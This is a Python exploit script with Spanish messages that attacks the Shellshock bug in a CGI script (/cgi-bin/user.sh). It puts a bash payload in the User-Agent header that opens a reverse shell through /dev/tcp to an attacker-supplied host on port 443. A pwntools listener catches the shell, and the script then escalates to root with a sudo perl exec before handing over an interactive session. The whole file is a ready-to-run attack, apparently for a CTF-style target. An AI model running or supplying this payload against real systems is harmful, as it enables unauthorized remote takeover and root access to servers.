#!/usr/bin/python
#coding: utf-8

import requests, time, sys, threading, signal
from pwn import *

# Uso del programa
if(len(sys.argv)<2):
	print "\n[!]Uso del programa\n"
	print "\n\t[*]$ %s [ip_rhost] [ip_lhost]" % (sys.argv[0])
	sys.exit(1)

def def_handler(sig, frame):
	print "\n[!] Saliendo..."
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Declaración de variables
rhost = sys.argv[1]
lhost = sys.argv[2]
lport = 443
url = "http://%s/cgi-bin/user.sh" % rhost

def obtainShell():
	try:
		headers_data = {
			'User-Agent': "() { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/%s/443 0>&1'" % lhost # ShellShock
		}
		p1 = log.progress("ShellShock")
		p1.status("Realizando petición WEB")
		time.sleep(2)
		r = requests.get(url,headers=headers_data, timeout=2)
		p1.success("Explotado con éxito")
		time.sleep(2)
	except requests.exceptions.ReadTimeout:
		p1.success("Explotado con éxito")
		time.sleep(2)
	except:
		p1.failure("Error al explotar ShellShock")
		sys.exit(1)

if __name__ == '__main__':
	try:
		threading.Thread(target=obtainShell).start()
	except Exception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()
	p2 = log.progress("Shell")
	p2.status("Esperando conexión...")
	if shell.sock is None:
		p2.failure("No se ha obtenido ninguna conexión")
		time.sleep(2)
		system.exit(1)
	else:
		p2.success("Se ha obtenido una conexión")
		time.sleep(2)

	shell.sendline("""sudo perl -e 'exec "/bin/bash";' """)
	shell.interactive()
